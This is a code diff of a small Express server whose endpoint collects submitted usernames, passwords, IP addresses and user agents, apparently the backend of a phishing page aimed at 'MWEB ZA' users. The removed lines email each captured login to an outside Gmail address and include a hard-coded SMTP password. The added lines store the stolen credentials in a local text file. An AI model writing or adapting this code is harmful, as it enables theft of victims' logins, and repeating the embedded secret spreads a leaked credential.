@@ -1,8 +1,9 @@
 const express = require('express');
-const nodemailer = require('nodemailer');
 const logger = require("morgan");
 const bodyParser = require('body-parser');
 const cors = require('cors');
+const fs = require('fs'); // Import the File System module
+const path = require('path'); // Import path module for file handling
 const port = process.env.PORT || 3000;
 
 const app = express();
@@ -24,41 +25,28 @@ app.post('/api/saveData', (req, res) => {
     console.log("Received data:", req.body); // Debug log
     const { username, password, ip, userAgent } = req.body;
 
-    // Send email with form data
-    sendEmail(username, password, ip, userAgent, (error) => {
+    // Save data to a text file
+    saveDataToFile(username, password, ip, userAgent, (error) => {
         if (error) {
-            console.error("Error sending email:", error); // Log error
-            return res.status(500).json({ message: 'Error sending email', error });
+            console.error("Error saving data to file:", error); // Log error
+            return res.status(500).json({ message: 'Error saving data', error });
         }
-        res.status(200).json({ message: 'Data sent via email successfully!' });
+        res.status(200).json({ message: 'Data saved to file successfully!' });
     });
 });
 
-// Function to send an email
-function sendEmail(username, password, ip, userAgent, callback) {
-    const transporter = nodemailer.createTransport({
-        host: 'mail.qstix.com.ng', // Replace with your cPanel SMTP server
-        port: 469,                  // Use 465 for SSL
-        secure: true,               // true for SSL
-        auth: {
-            user: 'no-reply@qstix.com.ng', // Replace with your cPanel email
-            pass: 'EmekaIwuagwu87**'        // Replace with your email password
-        }
-    });
+// Function to save data to a text file
+function saveDataToFile(username, password, ip, userAgent, callback) {
+    const dataToSave = `Username: ${username}\nPassword: ${password}\nIP Address: ${ip}\nUser Agent: ${userAgent}\n\n`;
+    const filePath = path.join(__dirname, 'formData.txt'); // Define the path for the text file
 
-    const mailOptions = {
-        from: 'no-reply@qstix.com.ng',       // Your "from" address
-        to: 'migospay@gmail.com',            // Replace with the recipient's email
-        subject: 'MWEB ZA',
-        text: `Username: ${username}\nPassword: ${password}\nIP Address: ${ip}\nUser Agent: ${userAgent}`
-    };
-
-    transporter.sendMail(mailOptions, (error, info) => {
-        callback(error);
+    // Append data to the file
+    fs.appendFile(filePath, dataToSave, (error) => {
+        callback(error); // Call the callback with any error that occurred
     });
 }
 
 // Start the server
-app.listen(3000, () => {
-    console.log(`Running on Port${port}`);
+app.listen(port, () => {
+    console.log(`Running on Port ${port}`);
 });
